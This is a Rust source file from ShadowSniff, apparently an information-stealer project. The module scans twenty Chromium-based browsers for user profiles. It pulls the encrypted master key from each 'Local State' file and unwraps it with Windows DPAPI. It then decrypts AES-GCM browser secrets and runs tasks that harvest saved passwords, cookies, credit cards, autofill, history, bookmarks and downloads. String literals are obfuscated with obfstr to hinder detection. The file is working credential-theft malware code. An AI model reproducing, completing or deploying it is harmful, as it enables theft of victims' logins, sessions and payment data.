/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

mod autofill;
mod bookmarks;
mod cookies;
mod credit_cards;
mod downloads;
mod history;
mod passwords;

use crate::chromium::autofill::AutoFillTask;
use crate::chromium::bookmarks::BookmarksTask;
use crate::chromium::cookies::CookiesTask;
use crate::chromium::credit_cards::CreditCardsTask;
use crate::chromium::downloads::DownloadsTask;
use crate::chromium::history::HistoryTask;
use crate::chromium::passwords::PasswordsTask;
use crate::vec;
use alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use core::ffi::c_void;
use core::mem::zeroed;
use core::ptr::null_mut;
use core::slice;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use json::parse;
use obfstr::obfstr as s;
use tasks::{CompositeTask, Task, composite_task};
use utils::base64::base64_decode_string;
use windows_sys::Win32::Foundation::LocalFree;
use windows_sys::Win32::Security::Cryptography::{
    BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO,
    BCRYPT_CHAIN_MODE_GCM, BCRYPT_CHAINING_MODE, BCRYPT_KEY_HANDLE, BCryptCloseAlgorithmProvider,
    BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider,
    BCryptSetProperty, CRYPT_INTEGER_BLOB, CryptUnprotectData,
};

pub(crate) struct ChromiumTask<'a, C: Collector, F: FileSystem> {
    tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask<C, F>)>,
}

impl<C: Collector + 'static, F: FileSystem + 'static> Default for ChromiumTask<'_, C, F> {
    fn default() -> Self {
        let all_browsers = get_chromium_browsers();
        let mut tasks = vec![];

        for base_browser in all_browsers {
            let Some(browser) = get_browser(&StorageFileSystem, &base_browser) else {
                continue;
            };

            let browser = Arc::new(browser);

            tasks.push((
                base_browser,
                composite_task!(
                    CookiesTask::new(browser.clone()),
                    BookmarksTask::new(browser.clone()),
                    AutoFillTask::new(browser.clone()),
                    PasswordsTask::new(browser.clone()),
                    DownloadsTask::new(browser.clone()),
                    CreditCardsTask::new(browser.clone()),
                    HistoryTask::new(browser.clone()),
                ),
            ))
        }

        Self { tasks }
    }
}

fn get_browser<F>(filesystem: &F, browser: &ChromiumBasedBrowser) -> Option<BrowserData>
where
    F: FileSystem,
{
    if !filesystem.is_exists(&browser.user_data) {
        return None;
    }

    let master_key = unsafe { extract_master_key(&browser.user_data) };
    let app_bound_encryption_key = unsafe { extract_app_bound_encrypted_key(&browser.user_data) };

    if !browser.has_profiles {
        return Some(BrowserData {
            master_key,
            app_bound_encryption_key,
            profiles: vec![browser.user_data.clone()],
        });
    }

    let mut profiles = vec![];

    for profile in
        filesystem.list_files_filtered(&browser.user_data, &|path| filesystem.is_dir(path))?
    {
        if let Some(profile_files) = filesystem.list_files_filtered(&profile, &is_in_profile_folder)
            && !profile_files.is_empty()
        {
            profiles.push(profile);
        }
    }

    if profiles.is_empty() {
        None
    } else {
        Some(BrowserData {
            master_key,
            app_bound_encryption_key,
            profiles,
        })
    }
}

fn is_in_profile_folder(path: &Path) -> bool {
    path.fullname()
        .map(|name| name.ends_with("Profile.ico") || name.ends_with("LOG"))
        .unwrap_or(false)
}

impl<C: Collector, F: FileSystem> Task<C, F> for ChromiumTask<'_, C, F> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        for (browser, task) in &self.tasks {
            let parent = parent / browser.name;
            task.run(&parent, filesystem, collector)
        }
    }
}

pub(super) struct BrowserData {
    master_key: Option<Vec<u8>>,
    app_bound_encryption_key: Option<Vec<u8>>,
    profiles: Vec<Path>,
}

pub(super) struct ChromiumBasedBrowser<'a> {
    name: &'a str,
    has_profiles: bool,
    user_data: Path,
}

impl<'a> ChromiumBasedBrowser<'a> {
    pub(super) fn new(name: &'a str, has_profiles: bool, user_data: Path) -> Self {
        Self {
            name,
            has_profiles,
            user_data,
        }
    }
}

macro_rules! browser_without_profiles {
    ($name:expr, $path:expr) => {
        ChromiumBasedBrowser::new($name, false, $path)
    };
}
macro_rules! browser {
    ($name:expr, $path:expr) => {
        ChromiumBasedBrowser::new($name, true, $path)
    };
}

fn get_chromium_browsers<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
    let local = Path::localappdata();
    let appdata = Path::appdata();
    let user_data = s!("User Data").to_owned();

    [
        browser!("Amingo", &local / s!("Amingo") / &user_data),
        browser!("Torch", &local / s!("Torch") / &user_data),
        browser!("Kometa", &local / s!("Kometa") / &user_data),
        browser!("Orbitum", &local / s!("Orbitum") / &user_data),
        browser!(
            "Epic Private",
            &local / s!("Epic Privacy Browser") / &user_data
        ),
        browser!("Cent", &local / s!("CentBrowser") / &user_data),
        browser!("Vivaldi", &local / s!("Vivaldi") / &user_data),
        browser!("Chromium", &local / s!("Chromium") / &user_data),
        browser!("Thorium", &local / s!("Thorium") / &user_data),
        browser_without_profiles!(
            "Opera",
            &appdata / s!("Opera Software") / s!("Opera Stable")
        ),
        browser_without_profiles!(
            "Opera GX",
            &appdata / s!("Opera Software") / s!("Opera GX Stable")
        ),
        browser!("7Star", &local / s!("7Star") / s!("7Star") / &user_data),
        browser!(
            "Sputnik",
            &local / s!("Sputnik") / s!("Sputnik") / &user_data
        ),
        browser!(
            "Chrome SxS",
            &local / s!("Google") / s!("Chrome SxS") / &user_data
        ),
        browser!("Chrome", &local / s!("Google") / s!("Chrome") / &user_data),
        browser!("Edge", &local / s!("Microsoft") / s!("Edge") / &user_data),
        browser!("Uran", &local / s!("uCozMedia") / s!("Uran") / &user_data),
        browser!(
            "Yandex",
            &local / s!("Yandex") / s!("YandexBrowser") / &user_data
        ),
        browser!(
            "Brave",
            &local / s!("BraveSoftware") / s!("Brave-Browser") / &user_data
        ),
        browser!("Atom", &local / s!("Mail.Ru") / s!("Atom") / &user_data),
    ]
}

pub(super) fn decrypt_data(buffer: &[u8], browser_data: &BrowserData) -> Option<String> {
    decrypt_protected_data(
        buffer,
        browser_data.master_key.as_deref(),
        browser_data.app_bound_encryption_key.as_deref(),
    )
}

pub fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
    let in_blob = CRYPT_INTEGER_BLOB {
        cbData: data.len() as _,
        pbData: data.as_ptr() as *mut u8,
    };

    let mut out_blob: CRYPT_INTEGER_BLOB = unsafe { zeroed() };

    let success = unsafe {
        CryptUnprotectData(
            &in_blob,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            &mut out_blob,
        )
    };

    if success == 0 {
        return None;
    }

    let decrypted =
        unsafe { slice::from_raw_parts(out_blob.pbData, out_blob.cbData as _).to_vec() };
    unsafe { LocalFree(out_blob.pbData as _) };
    Some(decrypted)
}

/// Decrypts Chromium-encrypted data from a provided buffer.
///
/// This function handles decryption of data formats used by Chromium-based browsers
/// for securely storing secrets (e.g., cookies, tokens). It supports different encryption
/// versions and chooses the appropriate decryption method based on the version byte in
/// the input buffer.
///
/// # Parameters
/// - `buffer`: A byte slice containing the encrypted data.
/// - `master_key`: An optional byte slice of the master key used for AES-GCM decryption in v1x format.
/// - `app_bound_encryption_key`: An optional byte slice of the app-bound encryption key used for v2x format.
///
/// # Returns
/// - `Some(String)`: The decrypted string if decryption is successful.
/// - `None`: If the buffer is empty, the version is unsupported, or required keys are missing.
///
/// # Chromium Encryption Versions
/// - **v2x**: Requires `app_bound_encryption_key`.
///   ### Currently NOT implemented!.
/// - **v1x**: Requires `master_key`. The buffer is expected to contain:
///     - IV (12 bytes) starting at index 3,
///     - Ciphertext up to the last 16 bytes,
///     - Tag (16 bytes) at the end of the buffer.
///     Decryption is performed using AES-GCM.
/// - **Unprefixed/legacy format**: Uses Windows Data Protection API (`CryptUnprotectData`) directly with no additional keys.
///
/// # Safety
/// This function is marked `unsafe` because it may call into Windows APIs (`CryptUnprotectData`) or perform unchecked
/// pointer dereferencing in the decryption process. Use with caution and ensure inputs are valid.
///
pub fn decrypt_protected_data(
    buffer: &[u8],
    master_key: Option<&[u8]>,
    app_bound_encryption_key: Option<&[u8]>,
) -> Option<String> {
    if buffer.is_empty() {
        return None;
    }

    match &buffer[1] {
        b'2' if app_bound_encryption_key.is_some() => {
            // Todo: Not implemented yet
            None
        }
        b'1' if master_key.is_some() => {
            let iv = &buffer[3..15];
            let ciphertext = &buffer[15..buffer.len() - 16];
            let tag = &buffer[buffer.len() - 16..];
            decrypt_aes_gcm(iv, ciphertext, tag, master_key?)
        }
        _ => Some(String::from_utf8_lossy(&crypt_unprotect_data(buffer)?).to_string()),
    }
}

fn decrypt_aes_gcm(
    iv: &[u8],
    ciphertext: &[u8],
    tag: &[u8],
    encryption_key: &[u8],
) -> Option<String> {
    let mut alg: BCRYPT_ALG_HANDLE = null_mut();
    let mut key: BCRYPT_KEY_HANDLE = null_mut();

    let status =
        unsafe { BCryptOpenAlgorithmProvider(&mut alg, BCRYPT_AES_ALGORITHM, null_mut(), 0) };

    if status != 0 {
        return None;
    }

    let status = unsafe {
        BCryptSetProperty(
            alg,
            BCRYPT_CHAINING_MODE,
            BCRYPT_CHAIN_MODE_GCM as *const _,
            30, // sizeof("ChainingModeGCM")
            0,
        )
    };

    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let status = unsafe {
        BCryptGenerateSymmetricKey(
            alg,
            &mut key,
            null_mut(),
            0,
            encryption_key.as_ptr() as *mut _,
            encryption_key.len() as _,
            0,
        )
    };

    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        cbSize: size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32,
        dwInfoVersion: 1,
        pbNonce: iv.as_ptr() as *mut u8,
        cbNonce: iv.len() as u32,
        pbAuthData: null_mut(),
        cbAuthData: 0,
        pbTag: tag.as_ptr() as *mut u8,
        cbTag: tag.len() as u32,
        pbMacContext: null_mut(),
        cbMacContext: 0,
        cbAAD: 0,
        cbData: 0,
        dwFlags: 0,
    };

    let mut decrypted = vec![0u8; ciphertext.len()];
    let mut decrypted_size: u32 = 0;

    let status = unsafe {
        BCryptDecrypt(
            key,
            ciphertext.as_ptr() as *const _,
            ciphertext.len() as _,
            &auth_info as *const _ as *mut c_void,
            null_mut(),
            0,
            decrypted.as_mut_ptr(),
            decrypted.len() as _,
            &mut decrypted_size,
            0,
        )
    };

    unsafe {
        BCryptDestroyKey(key);
        BCryptCloseAlgorithmProvider(alg, 0);
    }

    if status != 0 {
        return None;
    }

    Some(String::from_utf8_lossy(&decrypted[..decrypted_size as usize]).to_string())
}

pub unsafe fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
    let key = extract_key(user_data, s!("encrypted_key"))?;
    crypt_unprotect_data(&key[5..])
}

pub unsafe fn extract_app_bound_encrypted_key(user_data: &Path) -> Option<Vec<u8>> {
    let key = extract_key(user_data, s!("app_bound_encrypted_key"))?;
    match &key[..4] {
        b"APPB" => Some(key[4..].to_vec()),
        _ => None,
    }
}

fn extract_key(user_data: &Path, key: &str) -> Option<Vec<u8>> {
    let bytes = StorageFileSystem
        .read_file(user_data / s!("Local State"))
        .ok()?;

    let parsed = parse(&bytes).ok()?;

    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(key)?.as_string()?.clone();

    let key = base64_decode_string(&key_in_base64)?;
    Some(key)
}
